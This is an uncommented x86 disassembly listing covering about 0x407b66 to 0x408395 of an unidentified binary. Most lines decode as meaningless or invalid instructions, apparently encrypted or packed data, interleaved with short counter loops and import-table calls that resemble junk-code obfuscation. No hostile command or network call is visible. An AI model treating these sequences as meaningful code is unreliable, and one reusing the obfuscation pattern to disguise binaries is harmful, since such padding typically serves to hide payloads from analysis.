  407b66:	ret    0xf018
  407b69:	cwde   
  407b6a:	shr    dl,cl
  407b6c:	sbb    DWORD PTR [edx],esi
  407b6e:	jnp    0x407ba7
  407b70:	hlt    
  407b71:	iret   
  407b72:	push   ebp
  407b73:	jle    0x407bf4
  407b75:	mov    ebp,0x75089574
  407b7a:	cmp    ch,cl
  407b7c:	bound  ebp,QWORD PTR ss:[eax-0x71b7ab8e]
  407b83:	mov    edi,0x73b143
  407b88:	cmp    DWORD PTR [edi],0x581047ab
  407b8e:	(bad)  
  407b8f:	cmp    cl,ah
  407b91:	clc    
  407b92:	ins    DWORD PTR es:[edi],dx
  407b93:	mov    ds:0x98ecc5ff,al
  407b98:	fsub   st(4),st
  407b9a:	fcomp  DWORD PTR [ecx]
  407b9c:	int3   
  407b9d:	icebp  
  407b9e:	sahf   
  407b9f:	sbb    eax,0x52fd7c9
  407ba4:	mov    esi,0xe33a3788
  407ba9:	xor    DWORD PTR [edx-0x63b6c4bd],ecx
  407baf:	jmp    0x407b46
  407bb1:	jge    0x407bb3
  407bb3:	mov    eax,ds:0x148fbb91
  407bb8:	loope  0x407ba3
  407bba:	ret    
  407bbb:	mov    edi,0x7fcdb985
  407bc0:	jl     0x407b86
  407bc2:	push   ebx
  407bc3:	xor    BYTE PTR [edi-0x783e5869],cl
  407bc9:	sub    DWORD PTR [ebx-0x69],edx
  407bcc:	add    al,bl
  407bce:	sbb    DWORD PTR [ebp+0x5b31da63],0x76
  407bd5:	(bad)  
  407bd6:	imul   esi,edx,0xbcfc7dab
  407bdc:	addr16 daa 
  407bde:	ret    0x859f
  407be1:	add    DWORD PTR [esp+eax*2-0x12acd4df],ebp
  407be8:	cwde   
  407be9:	push   ss
  407bea:	fbld   TBYTE PTR [eax+0x4cdf74e1]
  407bf0:	xor    bl,al
  407bf2:	inc    ecx
  407bf3:	push   esi
  407bf4:	adc    ah,al
  407bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bf7:	adc    eax,0xf5ab46ec
  407bfc:	out    dx,al
  407bfd:	jno    0x407c03
  407bff:	push   edi
  407c00:	in     al,dx
  407c01:	(bad)  
  407c02:	nop
  407c03:	mov    ?,WORD PTR [esi+ecx*1+0x1]
  407c07:	pop    ss
  407c08:	pop    ebp
  407c09:	jno    0x407c13
  407c0b:	mov    al,ds:0xd68b6d5a
  407c10:	mov    ds:0xb7c3549e,al
  407c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c16:	aam    0xc2
  407c18:	icebp  
  407c19:	aas    
  407c1a:	adc    al,0x2
  407c1c:	arpl   WORD PTR [esi],di
  407c1e:	push   0xffffffae
  407c20:	or     BYTE PTR [eax],dh
  407c22:	jns    0x407c5b
  407c24:	imul   ecx,DWORD PTR [ecx+0x44],0xffffffa3
  407c28:	push   cs
  407c29:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  407c2b:	xor    ecx,DWORD PTR [eax]
  407c2d:	pushf  
  407c2e:	add    edi,edx
  407c30:	xchg   esi,eax
  407c31:	or     ch,bh
  407c33:	pop    ax
  407c35:	mov    al,0x3d
  407c37:	and    al,0xb7
  407c39:	test   BYTE PTR [ecx-0x10],ah
  407c3c:	sub    esi,edx
  407c3e:	jns    0x407c04
  407c40:	mov    dl,0x94
  407c42:	inc    ebx
  407c43:	mov    BYTE PTR [edi+eax*1+0x62],0x1c
  407c48:	ficom  DWORD PTR ds:0x216dcd69
  407c4e:	mov    ebx,0x88e39eea
  407c53:	daa    
  407c54:	or     ebx,DWORD PTR [ebp+0x2dbe7e9]
  407c5a:	adc    DWORD PTR [eax+0x16],esp
  407c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5e:	cmp    ah,ah
  407c60:	ficom  DWORD PTR [ebp+esi*8-0x10]
  407c64:	(bad)  
  407c66:	jmp    0x407cb2
  407c68:	dec    esp
  407c69:	jmp    FWORD PTR [ebp+0x76]
  407c6c:	cmp    DWORD PTR [ecx],ebp
  407c6e:	mov    eax,0xa33f0067
  407c73:	push   ecx
  407c74:	inc    ebp
  407c75:	dec    edx
  407c76:	push   ss
  407c77:	xchg   edi,eax
  407c78:	fdivr  st(4),st
  407c7a:	cmp    dh,ch
  407c7c:	aam    0x3b
  407c7e:	mov    esi,0x78e75379
  407c83:	fdiv   DWORD PTR [ecx+ebx*2+0x3]
  407c87:	sub    al,0xa3
  407c89:	mov    edx,0x15bd5447
  407c8e:	jmp    0x792b0352
  407c93:	jae    0x407c5e
  407c95:	data16 out dx,al
  407c97:	dec    eax
  407c98:	ja     0x407c4f
  407c9a:	retf   
  407c9b:	mov    esi,0xb0c32ed5
  407ca0:	mov    ecx,0xadb4ba58
  407ca5:	fstp   DWORD PTR [edx]
  407ca7:	push   ebp
  407ca8:	gs lock and al,0xbf
  407cac:	mov    WORD PTR [ebp-0x47cca837],?
  407cb2:	in     eax,0x57
  407cb4:	aaa    
  407cb5:	and    BYTE PTR [eax-0x57],0x80
  407cb9:	push   eax
  407cba:	icebp  
  407cbb:	jmp    0x407cf1
  407cbd:	mov    ah,0x31
  407cbf:	(bad)  
  407cc1:	outs   dx,BYTE PTR ds:[esi]
  407cc2:	jo     0x407d2f
  407cc4:	cmc    
  407cc5:	aas    
  407cc6:	jo     0x407d2c
  407cc8:	dec    esp
  407cc9:	call   DWORD PTR [edx-0x1794cb83]
  407ccf:	mov    cl,0xb1
  407cd1:	sub    ecx,ebp
  407cd3:	mov    ah,0xd6
  407cd5:	jns    0x407c87
  407cd7:	fnstenv [ecx-0x3d]
  407cda:	fadd   DWORD PTR [edi+0x56]
  407cdd:	loopne 0x407cb3
  407cdf:	and    DWORD PTR [ebp-0x6558c245],0xffffffb2
  407ce6:	cmp    eax,0xe984905d
  407ceb:	popa   
  407cec:	mov    edi,0xc8ab4bf5
  407cf1:	daa    
  407cf2:	mov    edx,0xc1937556
  407cf7:	lea    ecx,[edx-0x44]
  407cfa:	inc    ebp
  407cfb:	test   al,0x46
  407cfd:	dec    edx
  407cfe:	test   ebp,edx
  407d00:	mov    BYTE PTR [esi-0x11],bl
  407d03:	imul   esi,DWORD PTR ss:[eax-0x15a06d87],0x3a
  407d0b:	and    dh,dl
  407d0d:	pop    edi
  407d0e:	in     eax,0xd9
  407d10:	sub    ebp,0x10
  407d13:	sbb    esi,DWORD PTR [eax+ecx*1+0x15]
  407d17:	loopne 0x407cd4
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43440e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43440e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43440e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x432a4e
  407d4c:	cmp    DWORD PTR ds:0x43440e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43440e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43440e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43440e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43440e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432e4e,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43441a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [ebx+0x13],dh
  407da3:	mov    esi,0x70ca4d60
  407da8:	jo     0x407e13
  407daa:	jg     0x407e1c
  407dac:	jo     0x407d60
  407dae:	dec    edi
  407daf:	jmp    0x407dee
  407db1:	loopne 0x407e20
  407db3:	sar    BYTE PTR [esi+0x79e310aa],cl
  407db9:	mov    dh,0x1f
  407dbb:	lahf   
  407dbc:	xchg   esp,eax
  407dbd:	inc    edi
  407dbe:	popa   
  407dbf:	or     BYTE PTR ds:0xd3e68c1f,0xa9
  407dc6:	icebp  
  407dc7:	xchg   edx,eax
  407dc8:	test   al,0x3d
  407dca:	shl    DWORD PTR ds:[ebx],1
  407dcd:	mov    eax,ds:0x226f4c50
  407dd2:	hlt    
  407dd3:	jnp    0x407df9
  407dd5:	ss es cmp dh,bh
  407dd9:	inc    ecx
  407dda:	(bad)  
  407ddb:	mov    esp,0x85320bac
  407de0:	pop    edx
  407de1:	mov    eax,0x1f571c42
  407de6:	stos   DWORD PTR es:[edi],eax
  407de7:	nop
  407de8:	dec    esi
  407de9:	jo     0x407d9d
  407deb:	jge    0x407e66
  407ded:	xchg   BYTE PTR [ebx-0x32],cl
  407df0:	gs xchg esi,eax
  407df2:	inc    esp
  407df3:	dec    esp
  407df4:	mov    ecx,0x6ccb5e24
  407df9:	fldenv [ebx]
  407dfb:	mov    ah,0x3f
  407dfd:	inc    esp
  407dfe:	and    al,0xd7
  407e00:	pmaxub mm7,QWORD PTR [edi+eiz*8+0x1c]
  407e05:	imul   eax,DWORD PTR [ecx+0x38],0x2f
  407e09:	xor    BYTE PTR [ecx-0x429484d],0xd0
  407e10:	inc    esi
  407e11:	push   edi
  407e12:	mov    dl,0xa5
  407e14:	pop    esi
  407e15:	scas   al,BYTE PTR es:[edi]
  407e16:	and    eax,0xf552ee72
  407e1b:	in     eax,dx
  407e1c:	push   ds
  407e1d:	dec    esi
  407e1e:	int    0x57
  407e20:	inc    esp
  407e21:	lahf   
  407e22:	mov    edi,0xb731a974
  407e27:	push   ss
  407e28:	clc    
  407e29:	mov    esp,DWORD PTR [edx-0x3f]
  407e2c:	test   eax,0xeca3bff3
  407e31:	push   esp
  407e32:	push   0xc256d647
  407e37:	(bad)  
  407e38:	sahf   
  407e39:	iret   
  407e3a:	ds pop ds
  407e3c:	cmp    al,0x65
  407e3e:	mov    ah,0x93
  407e40:	mov    ds:0xff5f35c,eax
  407e45:	xchg   esp,eax
  407e46:	push   eax
  407e47:	xchg   edx,eax
  407e48:	call   0x2972e4bb
  407e4d:	pop    edi
  407e4e:	xor    BYTE PTR [esi+0x419fb02c],bh
  407e54:	xor    al,0x37
  407e56:	pop    edx
  407e57:	add    edi,DWORD PTR [ecx+0x2d036e1e]
  407e5d:	bswap  ebx
  407e5f:	push   esp
  407e60:	xor    BYTE PTR [eax+0x2f],0xc4
  407e64:	add    al,BYTE PTR [eax]
  407e66:	fld    QWORD PTR [eax+esi*2]
  407e69:	inc    ebx
  407e6a:	mov    DWORD PTR [edx],esi
  407e6c:	stos   BYTE PTR es:[edi],al
  407e6d:	jno    0x407e36
  407e6f:	cmp    al,0x6e
  407e71:	iret   
  407e72:	jae    0x407e19
  407e74:	enter  0x5033,0x38
  407e78:	and    al,0xee
  407e7a:	mov    al,0xeb
  407e7c:	cld    
  407e7d:	mov    al,ds:0x1467cfd2
  407e82:	mov    cl,0x29
  407e84:	or     esp,DWORD PTR [ecx+0x341e83f]
  407e8a:	xor    ecx,DWORD PTR [eax+ecx*4]
  407e8d:	jno    0x407e85
  407e8f:	aam    0xe4
  407e91:	or     edi,DWORD PTR [esi]
  407e93:	sbb    DWORD PTR [ebp-0x13],edi
  407e96:	outs   dx,DWORD PTR ds:[esi]
  407e97:	xchg   ebx,eax
  407e98:	add    ebp,esp
  407e9a:	dec    esp
  407e9b:	ss ret 
  407e9d:	in     al,dx
  407e9e:	and    dl,BYTE PTR [edx+eiz*1]
  407ea1:	pop    edi
  407ea2:	clc    
  407ea3:	rcr    dh,cl
  407ea5:	pop    ebp
  407ea6:	je     0x407ece
  407ea8:	enter  0xc044,0x4b
  407eac:	jnp    0x407eb7
  407eae:	dec    edx
  407eaf:	rcl    BYTE PTR [ebx],1
  407eb1:	pop    ebp
  407eb2:	test   eax,0x646d6ba2
  407eb7:	shl    DWORD PTR ds:0xdfe44a74,1
  407ebd:	stos   DWORD PTR es:[edi],eax
  407ebe:	add    al,0x31
  407ec0:	ror    DWORD PTR [edx+0x4337ca00],0x4c
  407ec7:	ds inc ebp
  407ec9:	jle    0x407e4c
  407ecb:	scas   eax,DWORD PTR es:[edi]
  407ecc:	add    edi,ecx
  407ece:	imul   esp,DWORD PTR [ecx],0x3e
  407ed1:	push   edx
  407ed2:	fwait
  407ed3:	mov    ebx,ebp
  407ed5:	imul   esp,DWORD PTR [eax-0x484cb2a7],0x7f
  407edc:	dec    edx
  407edd:	inc    ecx
  407ede:	lods   eax,DWORD PTR ds:[esi]
  407edf:	inc    ebx
  407ee0:	adc    BYTE PTR [ebp+0x61bff92b],ah
  407ee6:	stos   BYTE PTR es:[edi],al
  407ee7:	rcr    BYTE PTR [ecx+0x366de1e1],0x76
  407eee:	xor    ebp,DWORD PTR [eax-0x62]
  407ef1:	xchg   esp,eax
  407ef2:	mov    bl,0x4c
  407ef4:	daa    
  407ef5:	mov    eax,ds:0x293660b3
  407efa:	or     BYTE PTR [edi-0x57936b84],ch
  407f00:	push   si
  407f02:	mov    ds:0x4cb841af,al
  407f07:	loopne 0x407eb1
  407f09:	call   0xcb7b:0x839560b1
  407f10:	stos   DWORD PTR es:[edi],eax
  407f11:	sbb    ebp,DWORD PTR [eax+ebx*8]
  407f14:	out    dx,al
  407f15:	push   edx
  407f16:	loopne 0x407f2a
  407f18:	cmp    BYTE PTR [ebp-0x74],ch
  407f1b:	pop    esi
  407f1c:	in     eax,dx
  407f1d:	in     eax,dx
  407f1e:	icebp  
  407f1f:	lea    edi,[ebp+0x7248f141]
  407f25:	mov    ebx,0x16d9b2fd
  407f2a:	mov    ecx,0x4b691bb9
  407f2f:	jecxz  0x407f13
  407f31:	dec    ecx
  407f32:	add    al,0x58
  407f34:	dec    edx
  407f35:	out    0x3a,eax
  407f37:	pop    esi
  407f38:	inc    ebx
  407f39:	fld    DWORD PTR ds:[bp+di+0x1260]
  407f3f:	js     0x407f37
  407f41:	mov    ch,0xd5
  407f43:	xor    bl,BYTE PTR [esi]
  407f45:	fcmovnu st,st(2)
  407f47:	scas   eax,DWORD PTR es:[edi]
  407f48:	jns    0x407f7f
  407f4a:	xor    ah,BYTE PTR [eax]
  407f4c:	stc    
  407f4d:	or     ebx,0x61
  407f50:	cmp    BYTE PTR [eax+0x78],ch
  407f53:	mov    WORD PTR [ebp+0x4a],cs
  407f56:	mov    esp,0x163bd38
  407f5b:	in     al,dx
  407f5c:	mov    WORD PTR ds:[edx+0x78c6aea0],?
  407f63:	mov    es,esp
  407f65:	mov    bl,0x55
  407f67:	dec    edx
  407f68:	mov    ebp,DWORD PTR [edi+ebx*8-0x51]
  407f6c:	mov    ch,0x99
  407f6e:	pusha  
  407f6f:	mov    ebp,0x27c0158b
  407f74:	jg     0x407f34
  407f76:	loopne 0x407f9b
  407f78:	add    eax,0xc7fc15f7
  407f7d:	xchg   esp,eax
  407f7e:	xchg   ecx,eax
  407f7f:	fcom   st(2)
  407f81:	xor    DWORD PTR [eax-0x41],0xffffffdf
  407f85:	push   ecx
  407f86:	repnz mov edi,0x4fc11001
  407f8c:	or     eax,0x96a3a871
  407f91:	data16 jno 0x407fd6
  407f94:	cld    
  407f95:	fmul   QWORD PTR [ebp+0x42]
  407f98:	xchg   DWORD PTR [ecx+0x396151d0],esi
  407f9e:	in     eax,0x8e
  407fa0:	je     0x407f4b
  407fa2:	scas   eax,DWORD PTR es:[edi]
  407fa3:	popa   
  407fa4:	je     0x409cf3
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x4343fa,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432788,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43440a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43440a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43440a,edi
  407fe5:	cmp    DWORD PTR ds:0x43440a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43440a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432cbe
  40800a:	cmp    DWORD PTR ds:0x43440a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43440a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43440a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43441e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	cmp    al,BYTE PTR [ecx-0x37b9f026]
  408049:	jo     0x4080bb
  40804b:	imul   edi,DWORD PTR [edi+0x70],0x2ac8ac70
  408052:	jnp    0x407fef
  408054:	jns    0x40801b
  408056:	cwde   
  408057:	(bad)  
  408058:	or     ebx,edx
  40805a:	sbb    dl,BYTE PTR [ebx+0x7337b4f6]
  408060:	dec    esp
  408061:	mov    ch,0x66
  408063:	rol    DWORD PTR [ebx],1
  408065:	test   al,0x48
  408067:	jbe    0x408084
  408069:	scas   al,BYTE PTR es:[edi]
  40806a:	xor    al,0x10
  40806c:	imul   esi,DWORD PTR [ebx],0x3b46e568
  408072:	aaa    
  408073:	adc    al,0xcd
  408075:	sar    DWORD PTR [ebx],1
  408077:	imul   ecx,DWORD PTR [edi-0x671cbc9b],0x4a5799b6
  408081:	cmp    BYTE PTR [eax+eiz*1+0x36],bl
  408085:	out    0xc5,eax
  408087:	dec    edx
  408088:	cmc    
  408089:	js     0x40801f
  40808b:	jbe    0x4080b6
  40808d:	jg     0x40802d
  40808f:	imul   edi,DWORD PTR [ecx+0x38],0x45
  408093:	push   cs
  408094:	sub    ah,BYTE PTR [ebx]
  408096:	out    0x6e,eax
  408098:	mov    ecx,0xdbab17c8
  40809d:	or     eax,ebp
  40809f:	and    BYTE PTR [edi-0x2a166b7e],0x9c
  4080a6:	scas   al,BYTE PTR es:[edi]
  4080a7:	repz in eax,0x9c
  4080aa:	inc    edi
  4080ab:	(bad)  
  4080ac:	in     eax,dx
  4080ad:	sub    cl,BYTE PTR [edx-0x6d69e27]
  4080b3:	ins    DWORD PTR es:[edi],dx
  4080b4:	ror    BYTE PTR [ecx+edi*4-0x54],cl
  4080b8:	dec    ecx
  4080b9:	push   ebp
  4080ba:	xchg   ebp,eax
  4080bb:	xlat   BYTE PTR ds:[ebx]
  4080bc:	inc    esp
  4080bd:	xchg   ecx,eax
  4080be:	stos   BYTE PTR es:[edi],al
  4080bf:	and    edi,DWORD PTR [ebx-0x53]
  4080c2:	stos   DWORD PTR es:[edi],eax
  4080c3:	out    dx,eax
  4080c4:	push   ebx
  4080c5:	mov    bh,0x19
  4080c7:	jae    0x40806f
  4080c9:	lock sahf 
  4080cb:	mov    edi,0x36dc68fc
  4080d0:	ficom  WORD PTR [edi-0x2eefce6d]
  4080d6:	jae    0x40811c
  4080d8:	stc    
  4080d9:	test   eax,0x6601d14
  4080de:	pop    ss
  4080df:	pop    edx
  4080e0:	add    ebp,DWORD PTR [edi+eiz*1]
  4080e3:	inc    ebx
  4080e4:	dec    ebx
  4080e5:	sub    BYTE PTR [edx],ah
  4080e7:	and    DWORD PTR [ebp-0x4438df31],ebp
  4080ed:	mov    bh,BYTE PTR [esi]
  4080ef:	mov    edx,0xbaa45a42
  4080f4:	jb     0x40809d
  4080f6:	xor    ah,BYTE PTR fs:[eax+ebx*4-0x2929cc8c]
  4080fe:	ss pop ebp
  408100:	retf   
  408101:	iret   
  408102:	out    0xd,eax
  408104:	cdq    
  408105:	xchg   esp,eax
  408106:	jae    0x4080f7
  408108:	fs out dx,eax
  40810a:	lods   al,BYTE PTR ds:[esi]
  40810b:	ss je  0x4080e1
  40810e:	shl    ebx,cl
  408110:	jg     0x40813f
  408112:	mov    esi,0xcb1b78d8
  408117:	xor    al,0x89
  408119:	addr16 stc 
  40811b:	fistp  QWORD PTR [ebx-0x74501207]
  408121:	xchg   esi,eax
  408122:	imul   eax,edi,0xd049e696
  408128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408129:	push   esp
  40812a:	sub    eax,0x33b51b7c
  40812f:	sbb    DWORD PTR [esi+0x2c],esp
  408132:	mov    ds:0xee9e23e1,eax
  408137:	mov    dh,0xc0
  408139:	jecxz  0x4080d6
  40813b:	dec    edx
  40813c:	cmp    ah,dh
  40813e:	sub    DWORD PTR [ecx+0x4995c651],eax
  408144:	push   0xffffffa6
  408146:	mov    WORD PTR [ecx+eiz*1+0x4a],ss
  40814a:	aas    
  40814b:	sub    edi,DWORD PTR [eax]
  40814d:	sbb    al,0xb7
  40814f:	xchg   ecx,eax
  408150:	pop    eax
  408151:	push   ds
  408152:	daa    
  408153:	add    al,0x1b
  408155:	out    0x51,eax
  408157:	add    eax,0xbba296a5
  40815c:	loopne 0x4081b6
  40815e:	cdq    
  40815f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408160:	mov    esp,DWORD PTR [ebx]
  408162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408163:	dec    eax
  408164:	imul   ecx,DWORD PTR [edi-0xb81ad7e],0x29
  40816b:	iret   
  40816c:	sub    eax,0x16c99fe
  408171:	sahf   
  408172:	mov    dh,0xa8
  408174:	xor    ax,0xf0fe
  408178:	call   0x73ed:0x781d1a04
  40817f:	shl    edx,1
  408181:	xchg   edx,eax
  408182:	icebp  
  408183:	in     al,0xe
  408185:	sub    bh,BYTE PTR [eax-0x6e]
  408188:	mov    bh,0x76
  40818a:	xor    BYTE PTR [esi+0x832c033],bh
  408190:	out    0x4c,eax
  408192:	nop
  408193:	ret    
  408194:	stos   BYTE PTR es:[edi],al
  408195:	inc    esi
  408196:	jmp    0xc626:0xc9068280
  40819d:	sub    BYTE PTR [edi],al
  40819f:	jecxz  0x4081d1
  4081a1:	bound  esi,QWORD PTR [ecx]
  4081a3:	cwde   
  4081a4:	aaa    
  4081a5:	inc    ebp
  4081a6:	scas   eax,DWORD PTR es:[edi]
  4081a7:	jp     0x4081f5
  4081a9:	sahf   
  4081aa:	jmp    0x4081e0
  4081ac:	rcr    bl,0x46
  4081af:	daa    
  4081b0:	push   edx
  4081b1:	mov    dh,0x23
  4081b3:	or     al,0xc4
  4081b5:	sub    DWORD PTR [eax+0x44ba36eb],0xa5201077
  4081bf:	(bad)  
  4081c0:	ins    BYTE PTR es:[edi],dx
  4081c1:	test   DWORD PTR [ebx],esi
  4081c3:	pop    esp
  4081c4:	leave  
  4081c5:	daa    
  4081c6:	icebp  
  4081c7:	push   ss
  4081c8:	fdiv   QWORD PTR [eax-0x6]
  4081cb:	xchg   BYTE PTR [esi+0x6a],ch
  4081ce:	sub    al,0x53
  4081d0:	loope  0x408207
  4081d2:	or     ebx,DWORD PTR [edi+ecx*1]
  4081d5:	sbb    bl,bl
  4081d7:	adc    BYTE PTR [ecx],ch
  4081d9:	mov    eax,0x6d25f16f
  4081de:	push   eax
  4081df:	loopne 0x4081d2
  4081e1:	adc    BYTE PTR [edi-0x73],dh
  4081e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081e5:	pop    ss
  4081e6:	loop   0x408202
  4081e8:	pop    edx
  4081e9:	sahf   
  4081ea:	into   
  4081eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ec:	push   eax
  4081ed:	sbb    al,0x67
  4081ef:	repz adc ecx,DWORD PTR [ebp-0x7f23b0b6]
  4081f6:	test   al,0x74
  4081f8:	pop    edi
  4081f9:	or     BYTE PTR [edx+0x1f4164df],ch
  4081ff:	and    DWORD PTR [edi-0x41],0x63
  408203:	pop    es
  408204:	ins    DWORD PTR es:[edi],dx
  408205:	dec    esi
  408206:	ficomp WORD PTR [ebx-0x4a59bdba]
  40820c:	ins    DWORD PTR es:[edi],dx
  40820d:	dec    esp
  40820e:	xchg   esp,eax
  40820f:	dec    esi
  408210:	fmul   DWORD PTR [edi]
  408212:	sbb    eax,0xe743de40
  408217:	cmc    
  408218:	in     eax,0x81
  40821a:	dec    esp
  40821b:	imul   esp,DWORD PTR [edi+0x307e4d22],0x40059e7a
  408225:	sahf   
  408226:	fdiv   QWORD PTR [edi-0xc]
  408229:	sbb    al,BYTE PTR [esi+0x28]
  40822c:	push   ss
  40822d:	cmp    al,0xa4
  40822f:	pop    ebx
  408230:	outs   dx,BYTE PTR ds:[esi]
  408231:	imul   esp,DWORD PTR [edi+0x31],0xa13b60e7
  408238:	scas   al,BYTE PTR es:[edi]
  408239:	jbe    0x4081ce
  40823b:	jmp    0xc827:0xe370a3ed
  408242:	add    al,0x34
  408244:	loopne 0x4081ce
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432e62,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x4343f2,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434406,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	jecxz  0x4082b7
  408282:	jne    0x40826d
  408284:	mov    edi,0x697070d6
  408289:	jg     0x4082fb
  40828b:	jo     0x408224
  40828d:	popa   
  40828e:	mov    edi,0x4cd1f8bc
  408293:	xor    al,0x90
  408295:	in     eax,dx
  408296:	enter  0x49f2,0x43
  40829a:	pop    ds
  40829b:	dec    eax
  40829c:	das    
  40829d:	or     DWORD PTR [ecx+ecx*1+0x7152bad7],edx
  4082a4:	xchg   ebx,eax
  4082a5:	(bad)  
  4082a6:	outs   dx,DWORD PTR ds:[esi]
  4082a7:	rcr    BYTE PTR ds:0x6e9565d8,cl
  4082ad:	jp     0x4082cc
  4082af:	lods   al,BYTE PTR ds:[esi]
  4082b0:	fstp   TBYTE PTR [eax+edx*2]
  4082b3:	mov    dl,BYTE PTR [edx]
  4082b5:	ins    DWORD PTR es:[edi],dx
  4082b6:	fld    TBYTE PTR [esi-0x7b]
  4082b9:	push   edx
  4082ba:	adc    al,0x44
  4082bc:	adc    eax,0x7a8cd963
  4082c1:	cs mov esi,ebp
  4082c4:	aaa    
  4082c5:	mov    ebx,0x475d4db4
  4082ca:	add    edi,ebx
  4082cc:	ins    DWORD PTR es:[edi],dx
  4082cd:	ret    
  4082ce:	dec    ebx
  4082cf:	jmp    0x40830c
  4082d1:	test   BYTE PTR [edx-0x65a936a5],dl
  4082d7:	jbe    0x408349
  4082d9:	sub    eax,0x2fa800cd
  4082de:	loopne 0x4082b3
  4082e0:	(bad)  
  4082e2:	retf   0x1dc1
  4082e5:	push   ebx
  4082e6:	pop    eax
  4082e7:	push   esp
  4082e8:	mov    BYTE PTR [esi+0x37],0xb9
  4082ec:	cmp    dh,BYTE PTR [ecx+ecx*4-0x3dbad812]
  4082f3:	imul   ebp,DWORD PTR [edi+edx*4+0x72],0xfad71cc0
  4082fb:	mov    ah,0x59
  4082fd:	pop    ecx
  4082fe:	bound  eax,QWORD PTR [eax+ecx*8+0x16a3fc8d]
  408305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408306:	sub    ecx,DWORD PTR [esi]
  408308:	addr16 retf 0xec8a
  40830c:	xor    eax,0xea4e99bb
  408311:	mov    cl,0x7f
  408313:	sbb    al,0x26
  408315:	loopne 0x408297
  408317:	scas   al,BYTE PTR es:[edi]
  408318:	mov    dh,0xe7
  40831a:	inc    ebx
  40831b:	test   al,0xeb
  40831d:	and    esp,DWORD PTR [edx]
  40831f:	adc    BYTE PTR [ecx*2+0x76494699],0xc2
  408327:	sbb    BYTE PTR [ebx+0x41],al
  40832a:	add    eax,DWORD PTR [edx]
  40832c:	and    ebx,ebp
  40832e:	(bad)  
  40832f:	jl     0x408328
  408331:	test   ebx,edx
  408333:	cwde   
  408334:	jl     0x408301
  408336:	and    ecx,edi
  408338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408339:	add    eax,0xf834a858
  40833e:	fidivr DWORD PTR [esi-0x4ca1c411]
  408344:	neg    DWORD PTR [ecx-0x1797667d]
  40834a:	repz in eax,dx
  40834c:	shr    ch,0xbd
  40834f:	and    BYTE PTR [edx-0x69],dl
  408352:	adc    dl,BYTE PTR [ecx+0x56]
  408355:	test   eax,0x34b8717a
  40835a:	add    dh,dh
  40835c:	mov    al,BYTE PTR es:[ebx+eax*1-0x10]
  408361:	imul   DWORD PTR [edx]
  408363:	xor    al,0x25
  408365:	ins    DWORD PTR es:[edi],dx
  408366:	test   BYTE PTR [edi-0x15],ch
  408369:	xor    eax,0x50cf70d9
  40836e:	cmp    dh,al
  408370:	adc    eax,0x957cfd58
  408375:	sar    edx,0x47
  408378:	push   es
  408379:	lea    ecx,ds:0x24e78f98
  40837f:	dec    ecx
  408380:	ds or  eax,0x9ae6b59d
  408386:	push   cs
  408387:	jmp    0xac3e:0xa372f79a
  40838e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40838f:	pop    esi
  408390:	lods   eax,DWORD PTR ds:[esi]
  408391:	dec    ebp
  408392:	xchg   BYTE PTR [edx-0xa],ch
  408395:	iret   
